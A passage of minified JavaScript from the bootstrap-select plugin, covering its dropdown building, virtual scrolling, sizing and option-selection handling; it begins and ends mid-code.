this.$element.after(this.$newElement).prependTo(this.$newElement), this.$button = this.$newElement.children("button"), this.$menu = this.$newElement.children(W.MENU), this.$menuInner = this.$menu.children(".inner"), this.$searchbox = this.$menu.find("input"), this.$element.removeClass("bs-select-hidden"), !0 === this.options.dropdownAlignRight && this.$menu.addClass(q.MENURIGHT), void 0 !== t && this.$button.attr("data-id", t), this.checkDisabled(), this.clickListener(), this.options.liveSearch && this.liveSearchListener(), this.render(), this.setStyle(), this.setWidth(), this.options.container ? this.selectPosition() : this.$element.on("hide" + U, function () { var t, e; n.isVirtual() && (e = (t = n.$menuInner[0]).firstChild.cloneNode(!1), t.replaceChild(e, t.firstChild), t.scrollTop = 0) }), this.$menu.data("this", this), this.$newElement.data("this", this), this.options.mobile && this.mobile(), this.$newElement.on({ "hide.bs.dropdown": function (t) { n.$menuInner.attr("aria-expanded", !1), n.$element.trigger("hide" + U, t) }, "hidden.bs.dropdown": function (t) { n.$element.trigger("hidden" + U, t) }, "show.bs.dropdown": function (t) { n.$menuInner.attr("aria-expanded", !0), n.$element.trigger("show" + U, t) }, "shown.bs.dropdown": function (t) { n.$element.trigger("shown" + U, t) } }), n.$element[0].hasAttribute("required") && this.$element.on("invalid", function () { n.$button.addClass("bs-invalid"), n.$element.on("shown" + U + ".invalid", function () { n.$element.val(n.$element.val()).off("shown" + U + ".invalid") }).on("rendered" + U, function () { this.validity.valid && n.$button.removeClass("bs-invalid"), n.$element.off("rendered" + U) }), n.$button.on("blur" + U, function () { n.$element.focus().blur(), n.$button.off("blur" + U) }) }), setTimeout(function () { n.$element.trigger("loaded" + U) }) }, createDropdown: function () { var t, e = this.multiple || this.options.showTick ? " show-tick" : "", n = this.autofocus ? " autofocus" : "", i = "", o = "", a = "", s = ""; return this.options.header && (i = '<div class="' + q.POPOVERHEADER + '"><button type="button" class="close" aria-hidden="true">&times;</button>' + this.options.header + "</div>"), this.options.liveSearch && (o = '<div class="bs-searchbox"><input type="text" class="form-control" autocomplete="off"' + (null === this.options.liveSearchPlaceholder ? "" : ' placeholder="' + j(this.options.liveSearchPlaceholder) + '"') + ' role="textbox" aria-label="Search"></div>'), this.multiple && this.options.actionsBox && (a = '<div class="bs-actionsbox"><div class="btn-group btn-group-sm btn-block"><button type="button" class="actions-btn bs-select-all btn ' + q.BUTTONCLASS + '">' + this.options.selectAllText + '</button><button type="button" class="actions-btn bs-deselect-all btn ' + q.BUTTONCLASS + '">' + this.options.deselectAllText + "</button></div></div>"), this.multiple && this.options.doneButton && (s = '<div class="bs-donebutton"><div class="btn-group btn-block"><button type="button" class="btn btn-sm ' + q.BUTTONCLASS + '">' + this.options.doneButtonText + "</button></div></div>"), t = '<div class="dropdown bootstrap-select' + e + '"><button type="button" class="' + this.options.styleBase + ' dropdown-toggle" ' + ("static" === this.options.display ? 'data-display="static"' : "") + 'data-toggle="dropdown"' + n + ' role="button"><div class="filter-option"><div class="filter-option-inner"><div class="filter-option-inner-inner"></div></div> </div>' + ("4" === $.major ? "" : '<span class="bs-caret">' + this.options.template.caret + "</span>") + '</button><div class="' + q.MENU + " " + ("4" === $.major ? "" : q.SHOW) + '" role="combobox">' + i + o + a + '<div class="inner ' + q.SHOW + '" role="listbox" aria-expanded="false" tabindex="-1"><ul class="' + q.MENU + " inner " + ("4" === $.major ? q.SHOW : "") + '"></ul></div>' + s + "</div></div>", J(t) }, setPositionData: function () { this.selectpicker.view.canHighlight = []; for (var t = 0; t < this.selectpicker.current.data.length; t++) { var e = this.selectpicker.current.data[t], n = !0; "divider" === e.type ? (n = !1, e.height = this.sizeInfo.dividerHeight) : "optgroup-label" === e.type ? (n = !1, e.height = this.sizeInfo.dropdownHeaderHeight) : e.height = this.sizeInfo.liHeight, e.disabled && (n = !1), this.selectpicker.view.canHighlight.push(n), e.position = (0 === t ? 0 : this.selectpicker.current.data[t - 1].position) + e.height } }, isVirtual: function () { return !1 !== this.options.virtualScroll && this.selectpicker.main.elements.length >= this.options.virtualScroll || !0 === this.options.virtualScroll }, createView: function (G, t) { t = t || 0; var w = this; this.selectpicker.current = G ? this.selectpicker.search : this.selectpicker.main; var X, S, k = []; function n(t, e) { var n, i, o, a, s, r, g, l, c = w.selectpicker.current.elements.length, I = [], u = !0, h = w.isVirtual(); w.selectpicker.view.scrollTop = t, !0 === h && w.sizeInfo.hasScrollBar && w.$menu[0].offsetWidth > w.sizeInfo.totalMenuWidth && (w.sizeInfo.menuWidth = w.$menu[0].offsetWidth, w.sizeInfo.totalMenuWidth = w.sizeInfo.menuWidth + w.sizeInfo.scrollBarWidth, w.$menu.css("min-width", w.sizeInfo.menuWidth)), n = Math.ceil(w.sizeInfo.menuInnerHeight / w.sizeInfo.liHeight * 1.5), i = Math.round(c / n) || 1; for (var d, C, A, p, m = 0; m < i; m++) { var f = m === i - 1 ? c : (m + 1) * n; if (I[m] = [m * n + (m ? 1 : 0), f], !c) break; void 0 === s && t <= w.selectpicker.current.data[f - 1].position - w.sizeInfo.menuInnerHeight && (s = m) } if (void 0 === s && (s = 0), r = [w.selectpicker.view.position0, w.selectpicker.view.position1], o = Math.max(0, s - 1), a = Math.min(i - 1, s + 1), w.selectpicker.view.position0 = Math.max(0, I[o][0]) || 0, w.selectpicker.view.position1 = Math.min(c, I[a][1]) || 0, g = r[0] !== w.selectpicker.view.position0 || r[1] !== w.selectpicker.view.position1, void 0 !== w.activeIndex && (S = w.selectpicker.current.elements[w.selectpicker.current.map.newIndex[w.prevActiveIndex]], k = w.selectpicker.current.elements[w.selectpicker.current.map.newIndex[w.activeIndex]], X = w.selectpicker.current.elements[w.selectpicker.current.map.newIndex[w.selectedIndex]], e && (w.activeIndex !== w.selectedIndex && (k.classList.remove("active"), k.firstChild && k.firstChild.classList.remove("active")), w.activeIndex = void 0), w.activeIndex && w.activeIndex !== w.selectedIndex && X && X.length && (X.classList.remove("active"), X.firstChild && X.firstChild.classList.remove("active"))), void 0 !== w.prevActiveIndex && w.prevActiveIndex !== w.activeIndex && w.prevActiveIndex !== w.selectedIndex && S && S.length && (S.classList.remove("active"), S.firstChild && S.firstChild.classList.remove("active")), (e || g) && (l = w.selectpicker.view.visibleElements ? w.selectpicker.view.visibleElements.slice() : [], w.selectpicker.view.visibleElements = w.selectpicker.current.elements.slice(w.selectpicker.view.position0, w.selectpicker.view.position1), w.setOptionStatus(), (G || !1 === h && e) && (d = l, C = w.selectpicker.view.visibleElements, u = !(d.length === C.length && d.every(function (t, e) { return t === C[e] }))), (e || !0 === h) && u)) { var b, B, y = w.$menuInner[0], v = document.createDocumentFragment(), x = y.firstChild.cloneNode(!1), F = !0 === h ? w.selectpicker.view.visibleElements : w.selectpicker.current.elements; y.replaceChild(x, y.firstChild); for (var m = 0, Q = F.length; m < Q; m++)v.appendChild(F[m]); !0 === h && (b = 0 === w.selectpicker.view.position0 ? 0 : w.selectpicker.current.data[w.selectpicker.view.position0 - 1].position, B = w.selectpicker.view.position1 > c - 1 ? 0 : w.selectpicker.current.data[c - 1].position - w.selectpicker.current.data[w.selectpicker.view.position1 - 1].position, y.firstChild.style.marginTop = b + "px", y.firstChild.style.marginBottom = B + "px"), y.firstChild.appendChild(v) } w.prevActiveIndex = w.activeIndex, w.options.liveSearch ? G && e && (A = 0, w.selectpicker.view.canHighlight[A] || (A = 1 + w.selectpicker.view.canHighlight.slice(1).indexOf(!0)), p = w.selectpicker.view.visibleElements[A], w.selectpicker.view.currentActive && (w.selectpicker.view.currentActive.classList.remove("active"), w.selectpicker.view.currentActive.firstChild && w.selectpicker.view.currentActive.firstChild.classList.remove("active")), p && (p.classList.add("active"), p.firstChild && p.firstChild.classList.add("active")), w.activeIndex = w.selectpicker.current.map.originalIndex[A]) : w.$menuInner.focus() } this.setPositionData(), n(t, !0), this.$menuInner.off("scroll.createView").on("scroll.createView", function (t, e) { w.noScroll || n(this.scrollTop, e), w.noScroll = !1 }), J(window).off("resize" + U + "." + this.selectId + ".createView").on("resize" + U + "." + this.selectId + ".createView", function () { w.$newElement.hasClass(q.SHOW) && n(w.$menuInner[0].scrollTop) }) }, createLi: function () { var U, W = this, N = [], T = {}, H = 0, E = 0, R = [], Y = 0, O = 0, _ = -1; this.selectpicker.view.titleOption || (this.selectpicker.view.titleOption = document.createElement("option")); var t, V = { span: document.createElement("span"), subtext: document.createElement("small"), a: document.createElement("a"), li: document.createElement("li"), whitespace: document.createTextNode("Â ") }, L = document.createDocumentFragment(); (W.options.showTick || W.multiple) && ((t = V.span.cloneNode(!1)).className = W.options.iconBase + " " + W.options.tickIcon + " check-mark", V.a.appendChild(t)), V.a.setAttribute("role", "option"), V.subtext.className = "text-muted", V.text = V.span.cloneNode(!1), V.text.className = "text"; function M(t, e, n) { var i = V.li.cloneNode(!1); return t && (1 === t.nodeType || 11 === t.nodeType ? i.appendChild(t) : i.innerHTML = t), void 0 !== e && "" !== e && (i.className = e), null != n && i.classList.add("optgroup-" + n), i } function z(t, e, n) { var i = V.a.cloneNode(!0); return t && (11 === t.nodeType ? i.appendChild(t) : i.insertAdjacentHTML("beforeend", t)), void 0 !== e && "" !== e && (i.className = e), "4" === $.major && i.classList.add("dropdown-item"), n && i.setAttribute("style", n), i } function P(t) { var e, n, i, o = V.text.cloneNode(!1); return t.optionContent ? o.innerHTML = t.optionContent : (o.textContent = t.text, t.optionIcon && (n = V.whitespace.cloneNode(!1), (i = V.span.cloneNode(!1)).className = W.options.iconBase + " " + t.optionIcon, L.appendChild(i), L.appendChild(n)), t.optionSubtext && ((e = V.subtext.cloneNode(!1)).innerHTML = t.optionSubtext, o.appendChild(e))), L.appendChild(o), L } var e, n, i; this.options.title && !this.multiple && (_--, e = this.$element[0], i = !1, (n = !this.selectpicker.view.titleOption.parentNode) && (this.selectpicker.view.titleOption.className = "bs-title-option", this.selectpicker.view.titleOption.value = "", i = void 0 === J(e.options[e.selectedIndex]).attr("selected") && void 0 === this.$element.data("selected")), !n && 0 === this.selectpicker.view.titleOption.index || e.insertBefore(this.selectpicker.view.titleOption, e.firstChild), i && (e.selectedIndex = 0)); var K = this.$element.find("option"); K.each(function (t) { var e = J(this); if (_++, !e.hasClass("bs-title-option")) { var n, i, o, a, s, r, g, l, c = e.data(), I = this.className || "", u = j(this.style.cssText), h = c.content, d = this.textContent, C = c.tokens, A = c.subtext, p = c.icon, m = e.parent(), f = m[0], b = "OPTGROUP" === f.tagName, B = b && f.disabled, y = this.disabled || B, v = this.previousElementSibling && "OPTGROUP" === this.previousElementSibling.tagName, x = m.data(); if (!0 === c.hidden || this.hidden || W.options.hideDisabled && (y || B)) return X = c.prevHiddenIndex, e.next().data("prevHiddenIndex", void 0 !== X ? X : t), _--, T[t] = { type: "hidden", data: c }, v || void 0 !== X && (i = K[X].previousElementSibling) && "OPTGROUP" === i.tagName && !i.disabled && (v = !0), void (v && "divider" !== R[R.length - 1].type && (_++, N.push(M(!1, q.DIVIDER, Y + "div")), R.push({ type: "divider", optID: Y }))); if (b && !0 !== c.divider) { if (W.options.hideDisabled && y) if (void 0 === x.allOptionsDisabled && (o = m.children(), m.data("allOptionsDisabled", o.filter(":disabled").length === o.length)), m.data("allOptionsDisabled")) return void _--; var F, Q, G, w, X, S = " " + f.className || "", k = this.previousElementSibling; void 0 !== (X = c.prevHiddenIndex) && (k = K[X].previousElementSibling), k || (Y += 1, F = f.label, Q = j(F), G = x.subtext, w = x.icon, 0 !== t && 0 < N.length && (_++, N.push(M(!1, q.DIVIDER, Y + "div")), R.push({ type: "divider", optID: Y })), _++, a = { labelEscaped: Q, labelSubtext: G, labelIcon: w }, (l = V.text.cloneNode(!1)).innerHTML = a.labelEscaped, a.labelIcon && (r = V.whitespace.cloneNode(!1), (g = V.span.cloneNode(!1)).className = W.options.iconBase + " " + a.labelIcon, L.appendChild(g), L.appendChild(r)), a.labelSubtext && ((s = V.subtext.cloneNode(!1)).textContent = a.labelSubtext, l.appendChild(s)), L.appendChild(l), N.push(M(L, "dropdown-header" + S, Y)), R.push({ content: Q, subtext: G, type: "optgroup-label", optID: Y }), O = _ - 1), n = P({ text: d, optionContent: h, optionSubtext: A, optionIcon: p }), N.push(M(z(n, "opt " + I + S, u), "", Y)), R.push({ content: h || d, subtext: A, tokens: C, type: "option", optID: Y, headerIndex: O, lastIndex: O + f.childElementCount, originalIndex: t, data: c }), H++ } else !0 === c.divider ? (N.push(M(!1, q.DIVIDER)), R.push({ type: "divider", originalIndex: t, data: c })) : (!v && W.options.hideDisabled && void 0 !== (X = c.prevHiddenIndex) && (i = K[X].previousElementSibling) && "OPTGROUP" === i.tagName && !i.disabled && (v = !0), v && "divider" !== R[R.length - 1].type && (_++, N.push(M(!1, q.DIVIDER, Y + "div")), R.push({ type: "divider", optID: Y })), n = P({ text: d, optionContent: h, optionSubtext: A, optionIcon: p }), N.push(M(z(n, I, u))), R.push({ content: h || d, subtext: A, tokens: C, type: "option", originalIndex: t, data: c }), H++); W.selectpicker.main.map.newIndex[t] = _, W.selectpicker.main.map.originalIndex[_] = t; var D = R[R.length - 1]; D.disabled = y; var Z = 0; D.content && (Z += D.content.length), D.subtext && (Z += D.subtext.length), p && (Z += 1), E < Z && (E = Z, U = N[N.length - 1]) } }), this.selectpicker.main.elements = N, this.selectpicker.main.data = R, this.selectpicker.main.hidden = T, this.selectpicker.current = this.selectpicker.main, this.selectpicker.view.widestOption = U, this.selectpicker.view.availableOptionsCount = H }, findLis: function () { return this.$menuInner.find(".inner > li") }, render: function () { var t = this.$element.find("option"), e = [], n = []; this.togglePlaceholder(), this.tabIndex(); for (var i = 0, o = t.length; i < o; i++) { var a, s, r, g, l = this.selectpicker.main.map.newIndex[i], c = t[i], I = this.selectpicker.main.data[l] || this.selectpicker.main.hidden[i]; c && c.selected && I && (e.push(c), (n.length < 100 && "count" !== this.options.selectedTextFormat || 1 === e.length) && (s = (a = I.data).icon && this.options.showIcon ? '<i class="' + this.options.iconBase + " " + a.icon + '"></i> ' : "", r = this.options.showSubtext && a.subtext && !this.multiple ? ' <small class="text-muted">' + a.subtext + "</small>" : "", g = c.title ? c.title : a.content && this.options.showContent ? a.content.toString() : s + c.innerHTML.trim() + r, n.push(g))) } var u, h, d = this.multiple ? n.join(this.options.multipleSeparator) : n[0]; 50 < e.length && (d += "..."), !this.multiple || -1 === this.options.selectedTextFormat.indexOf("count") || (1 < (u = this.options.selectedTextFormat.split(">")).length && e.length > u[1] || 1 === u.length && 2 <= e.length) && (h = this.selectpicker.view.availableOptionsCount, d = ("function" == typeof this.options.countSelectedText ? this.options.countSelectedText(e.length, h) : this.options.countSelectedText).replace("{0}", e.length.toString()).replace("{1}", h.toString())), null == this.options.title && (this.options.title = this.$element.attr("title")), "static" == this.options.selectedTextFormat && (d = this.options.title), d = d || (void 0 !== this.options.title ? this.options.title : this.options.noneSelectedText), this.$button[0].title = A(d.replace(/<[^>]*>?/g, "").trim()), this.$button.find(".filter-option-inner-inner")[0].innerHTML = d, this.$element.trigger("rendered" + U) }, setStyle: function (t, e) { this.$element.attr("class") && this.$newElement.addClass(this.$element.attr("class").replace(/selectpicker|mobile-device|bs-select-hidden|validate\[.*\]/gi, "")); var n = t || this.options.style; "add" == e ? this.$button.addClass(n) : "remove" == e ? this.$button.removeClass(n) : (this.$button.removeClass(this.options.style), this.$button.addClass(n)) }, liHeight: function (t) { var e, n, i, o, a, s, r, g, l, c, I, u, h, d, C, A, p, m, f, b, B, y, v, x, F, Q, G, w; (t || !1 !== this.options.size && !this.sizeInfo) && (this.sizeInfo || (this.sizeInfo = {}), e = document.createElement("div"), n = document.createElement("div"), i = document.createElement("div"), o = document.createElement("ul"), a = document.createElement("li"), s = document.createElement("li"), r = document.createElement("li"), g = document.createElement("a"), l = document.createElement("span"), c = this.options.header && 0 < this.$menu.find("." + q.POPOVERHEADER).length ? this.$menu.find("." + q.POPOVERHEADER)[0].cloneNode(!0) : null, I = this.options.liveSearch ? document.createElement("div") : null, u = this.options.actionsBox && this.multiple && 0 < this.$menu.find(".bs-actionsbox").length ? this.$menu.find(".bs-actionsbox")[0].cloneNode(!0) : null, h = this.options.doneButton && this.multiple && 0 < this.$menu.find(".bs-donebutton").length ? this.$menu.find(".bs-donebutton")[0].cloneNode(!0) : null, d = this.$element.find("option")[0], this.sizeInfo.selectWidth = this.$newElement[0].offsetWidth, l.className = "text", g.className = "dropdown-item " + (d ? d.className : ""), e.className = this.$menu[0].parentNode.className + " " + q.SHOW, e.style.width = this.sizeInfo.selectWidth + "px", "auto" === this.options.width && (n.style.minWidth = 0), n.className = q.MENU + " " + q.SHOW, i.className = "inner " + q.SHOW, o.className = q.MENU + " inner " + ("4" === $.major ? q.SHOW : ""), a.className = q.DIVIDER, s.className = "dropdown-header", l.appendChild(document.createTextNode("â")), g.appendChild(l), r.appendChild(g), s.appendChild(l.cloneNode(!0)), this.selectpicker.view.widestOption && o.appendChild(this.selectpicker.view.widestOption.cloneNode(!0)), o.appendChild(r), o.appendChild(a), o.appendChild(s), c && n.appendChild(c), I && (C = document.createElement("input"), I.className = "bs-searchbox", C.className = "form-control", I.appendChild(C), n.appendChild(I)), u && n.appendChild(u), i.appendChild(o), n.appendChild(i), h && n.appendChild(h), e.appendChild(n), document.body.appendChild(e), A = g.offsetHeight, p = s ? s.offsetHeight : 0, m = c ? c.offsetHeight : 0, f = I ? I.offsetHeight : 0, b = u ? u.offsetHeight : 0, B = h ? h.offsetHeight : 0, y = J(a).outerHeight(!0), v = !!window.getComputedStyle && window.getComputedStyle(n), x = n.offsetWidth, F = v ? null : J(n), G = { vert: (Q = { vert: X(v ? v.paddingTop : F.css("paddingTop")) + X(v ? v.paddingBottom : F.css("paddingBottom")) + X(v ? v.borderTopWidth : F.css("borderTopWidth")) + X(v ? v.borderBottomWidth : F.css("borderBottomWidth")), horiz: X(v ? v.paddingLeft : F.css("paddingLeft")) + X(v ? v.paddingRight : F.css("paddingRight")) + X(v ? v.borderLeftWidth : F.css("borderLeftWidth")) + X(v ? v.borderRightWidth : F.css("borderRightWidth")) }).vert + X(v ? v.marginTop : F.css("marginTop")) + X(v ? v.marginBottom : F.css("marginBottom")) + 2, horiz: Q.horiz + X(v ? v.marginLeft : F.css("marginLeft")) + X(v ? v.marginRight : F.css("marginRight")) + 2 }, i.style.overflowY = "scroll", w = n.offsetWidth - x, document.body.removeChild(e), this.sizeInfo.liHeight = A, this.sizeInfo.dropdownHeaderHeight = p, this.sizeInfo.headerHeight = m, this.sizeInfo.searchHeight = f, this.sizeInfo.actionsHeight = b, this.sizeInfo.doneButtonHeight = B, this.sizeInfo.dividerHeight = y, this.sizeInfo.menuPadding = Q, this.sizeInfo.menuExtras = G, this.sizeInfo.menuWidth = x, this.sizeInfo.totalMenuWidth = this.sizeInfo.menuWidth, this.sizeInfo.scrollBarWidth = w, this.sizeInfo.selectHeight = this.$newElement[0].offsetHeight, this.setPositionData()) }, getSelectPosition: function () { var t, e = J(window), n = this.$newElement.offset(), i = J(this.options.container); this.options.container && !i.is("body") ? ((t = i.offset()).top += parseInt(i.css("borderTopWidth")), t.left += parseInt(i.css("borderLeftWidth"))) : t = { top: 0, left: 0 }; var o = this.options.windowPadding; this.sizeInfo.selectOffsetTop = n.top - t.top - e.scrollTop(), this.sizeInfo.selectOffsetBot = e.height() - this.sizeInfo.selectOffsetTop - this.sizeInfo.selectHeight - t.top - o[2], this.sizeInfo.selectOffsetLeft = n.left - t.left - e.scrollLeft(), this.sizeInfo.selectOffsetRight = e.width() - this.sizeInfo.selectOffsetLeft - this.sizeInfo.selectWidth - t.left - o[1], this.sizeInfo.selectOffsetTop -= o[0], this.sizeInfo.selectOffsetLeft -= o[3] }, setMenuSize: function (t) { this.getSelectPosition(); var e, n, i, o, a, s, r, g = this.sizeInfo.selectWidth, l = this.sizeInfo.liHeight, c = this.sizeInfo.headerHeight, I = this.sizeInfo.searchHeight, u = this.sizeInfo.actionsHeight, h = this.sizeInfo.doneButtonHeight, d = this.sizeInfo.dividerHeight, C = this.sizeInfo.menuPadding, A = 0; if (this.options.dropupAuto && (r = l * this.selectpicker.current.elements.length + C.vert, this.$newElement.toggleClass(q.DROPUP, this.sizeInfo.selectOffsetTop - this.sizeInfo.selectOffsetBot > this.sizeInfo.menuExtras.vert && r + this.sizeInfo.menuExtras.vert + 50 > this.sizeInfo.selectOffsetBot)), "auto" === this.options.size) o = 3 < this.selectpicker.current.elements.length ? 3 * this.sizeInfo.liHeight + this.sizeInfo.menuExtras.vert - 2 : 0, n = this.sizeInfo.selectOffsetBot - this.sizeInfo.menuExtras.vert, i = o + c + I + u + h, s = Math.max(o - C.vert, 0), this.$newElement.hasClass(q.DROPUP) && (n = this.sizeInfo.selectOffsetTop - this.sizeInfo.menuExtras.vert), e = (a = n) - c - I - u - h - C.vert; else if (this.options.size && "auto" != this.options.size && this.selectpicker.current.elements.length > this.options.size) { for (var p = 0; p < this.options.size; p++)"divider" === this.selectpicker.current.data[p].type && A++; e = (n = l * this.options.size + A * d + C.vert) - C.vert, a = n + c + I + u + h, i = s = "" } "auto" === this.options.dropdownAlignRight && this.$menu.toggleClass(q.MENURIGHT, this.sizeInfo.selectOffsetLeft > this.sizeInfo.selectOffsetRight && this.sizeInfo.selectOffsetRight < this.sizeInfo.totalMenuWidth - g), this.$menu.css({ "max-height": a + "px", overflow: "hidden", "min-height": i + "px" }), this.$menuInner.css({ "max-height": e + "px", "overflow-y": "auto", "min-height": s + "px" }), this.sizeInfo.menuInnerHeight = e, this.selectpicker.current.data.length && this.selectpicker.current.data[this.selectpicker.current.data.length - 1].position > this.sizeInfo.menuInnerHeight && (this.sizeInfo.hasScrollBar = !0, this.sizeInfo.totalMenuWidth = this.sizeInfo.menuWidth + this.sizeInfo.scrollBarWidth, this.$menu.css("min-width", this.sizeInfo.totalMenuWidth)), this.dropdown && this.dropdown._popper && this.dropdown._popper.update() }, setSize: function (t) { var e, n, i, o; this.liHeight(t), this.options.header && this.$menu.css("padding-top", 0), !1 !== this.options.size && (e = this, n = J(window), o = 0, this.setMenuSize(), "auto" === this.options.size ? (this.$searchbox.off("input.setMenuSize propertychange.setMenuSize").on("input.setMenuSize propertychange.setMenuSize", function () { return e.setMenuSize() }), n.off("resize" + U + "." + this.selectId + ".setMenuSize scroll" + U + "." + this.selectId + ".setMenuSize").on("resize" + U + "." + this.selectId + ".setMenuSize scroll" + U + "." + this.selectId + ".setMenuSize", function () { return e.setMenuSize() })) : this.options.size && "auto" != this.options.size && this.selectpicker.current.elements.length > this.options.size && (this.$searchbox.off("input.setMenuSize propertychange.setMenuSize"), n.off("resize" + U + "." + this.selectId + ".setMenuSize scroll" + U + "." + this.selectId + ".setMenuSize")), t ? o = this.$menuInner[0].scrollTop : e.multiple || "number" == typeof (i = e.selectpicker.main.map.newIndex[e.$element[0].selectedIndex]) && !1 !== e.options.size && (o = (o = e.sizeInfo.liHeight * i) - e.sizeInfo.menuInnerHeight / 2 + e.sizeInfo.liHeight / 2), e.createView(!1, o)) }, setWidth: function () { var n = this; "auto" === this.options.width ? requestAnimationFrame(function () { n.$menu.css("min-width", "0"), n.liHeight(), n.setMenuSize(); var t = n.$newElement.clone().appendTo("body"), e = t.css("width", "auto").children("button").outerWidth(); t.remove(), n.sizeInfo.selectWidth = Math.max(n.sizeInfo.totalMenuWidth, e), n.$newElement.css("width", n.sizeInfo.selectWidth + "px") }) : "fit" === this.options.width ? (this.$menu.css("min-width", ""), this.$newElement.css("width", "").addClass("fit-width")) : this.options.width ? (this.$menu.css("min-width", ""), this.$newElement.css("width", this.options.width)) : (this.$menu.css("min-width", ""), this.$newElement.css("width", "")), this.$newElement.hasClass("fit-width") && "fit" !== this.options.width && this.$newElement.removeClass("fit-width") }, selectPosition: function () { this.$bsContainer = J('<div class="bs-container" />'); function t(t) { var e = {}, n = s.options.display || !!J.fn.dropdown.Constructor.Default && J.fn.dropdown.Constructor.Default.display; s.$bsContainer.addClass(t.attr("class").replace(/form-control|fit-width/gi, "")).toggleClass(q.DROPUP, t.hasClass(q.DROPUP)), i = t.offset(), r.is("body") ? o = { top: 0, left: 0 } : ((o = r.offset()).top += parseInt(r.css("borderTopWidth")) - r.scrollTop(), o.left += parseInt(r.css("borderLeftWidth")) - r.scrollLeft()), a = t.hasClass(q.DROPUP) ? 0 : t[0].offsetHeight, ($.major < 4 || "static" === n) && (e.top = i.top - o.top + a, e.left = i.left - o.left), e.width = t[0].offsetWidth, s.$bsContainer.css(e) } var i, o, a, s = this, r = J(this.options.container); this.$button.on("click.bs.dropdown.data-api", function () { s.isDisabled() || (t(s.$newElement), s.$bsContainer.appendTo(s.options.container).toggleClass(q.SHOW, !s.$button.hasClass(q.SHOW)).append(s.$menu)) }), J(window).off("resize" + U + "." + this.selectId + " scroll" + U + "." + this.selectId).on("resize" + U + "." + this.selectId + " scroll" + U + "." + this.selectId, function () { s.$newElement.hasClass(q.SHOW) && t(s.$newElement) }), this.$element.on("hide" + U, function () { s.$menu.data("height", s.$menu.height()), s.$bsContainer.detach() }) }, setOptionStatus: function () { var t = this.$element.find("option"); if (this.noScroll = !1, this.selectpicker.view.visibleElements && this.selectpicker.view.visibleElements.length) for (var e = 0; e < this.selectpicker.view.visibleElements.length; e++) { var n, i, o = this.selectpicker.current.map.originalIndex[e + this.selectpicker.view.position0], a = t[o]; a && (n = this.selectpicker.main.map.newIndex[o], i = this.selectpicker.main.elements[n], this.setDisabled(o, a.disabled || "OPTGROUP" === a.parentNode.tagName && a.parentNode.disabled, n, i), this.setSelected(o, a.selected, n, i)) } }, setSelected: function (t, e, n, i) { var o, a, s, r = void 0 !== this.activeIndex, g = this.activeIndex === t || e && !this.multiple && !r; n = n || this.selectpicker.main.map.newIndex[t], s = (i = i || this.selectpicker.main.elements[n]).firstChild, e && (this.selectedIndex = t), i.classList.toggle("selected", e), i.classList.toggle("active", g), g && (this.selectpicker.view.currentActive = i, this.activeIndex = t), s && (s.classList.toggle("selected", e), s.classList.toggle("active", g), s.setAttribute("aria-selected", e)), g || !r && e && void 0 !== this.prevActiveIndex && (o = this.selectpicker.main.map.newIndex[this.prevActiveIndex], (a = this.selectpicker.main.elements[o]).classList.remove("active"), a.firstChild && a.firstChild.classList.remove("active")) }, setDisabled: function (t, e, n, i) { var o; n = n || this.selectpicker.main.map.newIndex[t], o = (i = i || this.selectpicker.main.elements[n]).firstChild, i.classList.toggle(q.DISABLED, e), o && ("4" === $.major && o.classList.toggle(q.DISABLED, e), o.setAttribute("aria-disabled", e), e ? o.setAttribute("tabindex", -1) : o.setAttribute("tabindex", 0)) }, isDisabled: function () { return this.$element[0].disabled }, checkDisabled: function () { var t = this; this.isDisabled() ? (this.$newElement.addClass(q.DISABLED), this.$button.addClass(q.DISABLED).attr("tabindex", -1).attr("aria-disabled", !0)) : (this.$button.hasClass(q.DISABLED) && (this.$newElement.removeClass(q.DISABLED), this.$button.removeClass(q.DISABLED).attr("aria-disabled", !1)), -1 != this.$button.attr("tabindex") || this.$element.data("tabindex") || this.$button.removeAttr("tabindex")), this.$button.click(function () { return !t.isDisabled() }) }, togglePlaceholder: function () { var t = this.$element[0], e = t.selectedIndex, n = -1 === e; n || t.options[e].value || (n = !0), this.$button.toggleClass("bs-placeholder", n) }, tabIndex: function () { this.$element.data("tabindex") !== this.$element.attr("tabindex") && -98 !== this.$element.attr("tabindex") && "-98" !== this.$element.attr("tabindex") && (this.$element.data("tabindex", this.$element.attr("tabindex")), this.$button.attr("tabindex", this.$element.data("tabindex"))), this.$element.attr("tabindex", -98) }, clickListener: function () { var x = this, e = J(document); function t() { x.options.liveSearch ? x.$searchbox.focus() : x.$menuInner.focus() } function n() { x.dropdown && x.dropdown._popper && x.dropdown._popper.state.isCreated ? t() : requestAnimationFrame(n) } e.data("spaceSelect", !1), this.$button.on("keyup", function (t) { /(32)/.test(t.keyCode.toString(10)) && e.data("spaceSelect") && (t.preventDefault(), e.data("spaceSelect", !1)) }), this.$newElement.on("show.bs.dropdown", function () { 3 < $.major && !x.dropdown && (x.dropdown = x.$button.data("bs.dropdown"), x.dropdown._menu = x.$menu[0]) }), this.$button.on("click.bs.dropdown.data-api", function () { x.$newElement.hasClass(q.SHOW) || x.setSize() }), this.$element.on("shown" + U, function () { x.$menuInner[0].scrollTop !== x.selectpicker.view.scrollTop && (x.$menuInner[0].scrollTop = x.selectpicker.view.scrollTop), 3 < $.major ? requestAnimationFrame(n) : t() }), this.$menuInner.on("click", "li a", function (t, e) { var n = J(this), i = x.isVirtual() ? x.selectpicker.view.position0 : 0, o = x.selectpicker.current.map.originalIndex[n.parent().index() + i], a = F(x.$element[0]), s = x.$element.prop("selectedIndex"), r = !0; if (x.multiple && 1 !== x.options.maxOptions && t.stopPropagation(), t.preventDefault(), !x.isDisabled() && !n.parent().hasClass(q.DISABLED)) { var g = x.$element.find("option"), l = g.eq(o), c = l.prop("selected"), I = l.parent("optgroup"), u = I.find("option"), h = x.options.maxOptions, d = I.data("maxOptions") || !1; if (o === x.activeIndex && (e = !0), e || (x.prevActiveIndex = x.activeIndex, x.activeIndex = void 0), x.multiple) { if (l.prop("selected", !c), x.setSelected(o, !c), n.blur(), !1 !== h || !1 !== d) { var C = h < g.filter(":selected").length, A = d < I.find("option:selected").length; if (h && C || d && A) if (h && 1 == h) { g.prop("selected", !1), l.prop("selected", !0); for (var p = 0; p < g.length; p++)x.setSelected(p, !1); x.setSelected(o, !0) } else if (d && 1 == d) { I.find("option:selected").prop("selected", !1), l.prop("selected", !0); for (p = 0; p < u.length; p++) { var m = u[p]; x.setSelected(g.index(m), !1) } x.setSelected(o, !0) } else { var f = "string" == typeof x.options.maxOptionsText ? [x.options.maxOptionsText, x.options.maxOptionsText] : x.options.maxOptionsText, b = "function" == typeof f ? f(h, d) : f, B = 